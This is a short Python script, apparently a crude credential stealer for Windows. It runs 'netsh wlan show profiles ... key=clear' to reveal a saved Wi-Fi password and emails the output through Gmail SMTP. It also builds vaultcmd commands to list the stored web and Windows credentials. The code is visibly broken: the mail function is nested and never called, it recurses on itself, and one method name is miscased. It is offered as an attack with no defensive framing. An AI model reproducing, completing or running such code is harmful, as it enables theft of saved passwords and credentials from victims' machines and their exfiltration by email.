import os
import subprocess
import smtplib

def GetPath():
    print("Getting Current working directory...")
    print(os.getcwd())
    print()

    def SendMail(email, password, message):

        # email = input("What is your email?>")
        # password = input("What is your Passoword for your email?>")

        WifiPass = "netsh wlan show profiles " + "WifiNetwork" + " key=clear"

        result = subprocess.check_output(WifiPass, shell=True)
        print(result)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.SendMail(email, email, message)
        server.quit()
        SendMail(email, password, result)

        return SendMail(email, password, message)

Web_Creds = "vaultcmd /listcreds:'Web Credentials' /all"
Win_Creds = "vaultcmd /listcreds:'Windows Credentials' /all"

print([Web_Creds, Win_Creds])
subprocess.check_output([Web_Creds, Win_Creds])
